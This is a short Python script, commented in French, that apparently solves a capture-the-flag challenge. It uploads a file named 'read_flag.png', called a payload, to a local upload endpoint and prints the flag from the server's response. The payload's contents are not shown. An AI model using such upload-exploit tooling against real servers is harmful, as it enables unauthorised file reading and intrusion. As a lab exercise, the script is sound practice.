#!/usr/bin/env python3
import os
import requests
from bs4 import BeautifulSoup

# URL du serveur local
UPLOAD_ENDPOINT = "http://127.0.0.1:9000/upload"

# Nom du fichier que l'on va uploader (payload)
payload_file = "read_flag.png"

# Vérifie que le fichier existe
if not os.path.exists(payload_file):
    print(f"Erreur : le fichier {payload_file} n'existe pas")
    exit(1)

# Envoi du fichier au serveur
with open(payload_file, "rb") as f:
    files = {"file": f}
    try:
        resp = requests.post(UPLOAD_ENDPOINT, files=files)
    except requests.exceptions.RequestException as e:
        print(f"Erreur de connexion au serveur : {e}")
        exit(1)

# Analyse de la réponse pour extraire le flag
soup = BeautifulSoup(resp.text, "html.parser")
pre = soup.find("pre")
if pre:
    print("[*] Flag récupéré :", pre.text.strip())
else:
    print("[!] Impossible de récupérer le flag, voici la réponse brute :")
    print(resp.text)

# Nettoyage local du payload si nécessaire
# os.remove(payload_file)
